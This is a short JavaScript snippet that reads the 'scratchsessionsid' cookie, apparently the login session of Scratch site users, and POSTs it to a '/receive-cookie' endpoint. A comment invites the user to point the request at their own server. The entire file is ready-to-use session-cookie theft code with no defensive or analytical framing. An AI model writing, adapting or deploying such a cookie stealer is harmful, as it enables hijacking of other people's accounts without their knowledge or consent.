// Function to get the value of a specified cookie
function getCookieValue(cookieName) {
    let name = cookieName + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

// Get the value of the 'scratchsessionsid' cookie
let scratchSessionId = getCookieValue('scratchsessionsid');

// Correctly replace with your server's HTTPS URL
fetch('/receive-cookie', { // Ensure the URL is correctly typed
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({ scratchsessionsid: scratchSessionId }),
})
.then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.json();
})
.then(data => {
    console.log('Cookie sent successfully:');
})
.catch(error => {
    console.error('Error sending cookie:', error);
    alert('Failed to send cookie: ' + error.message);
});
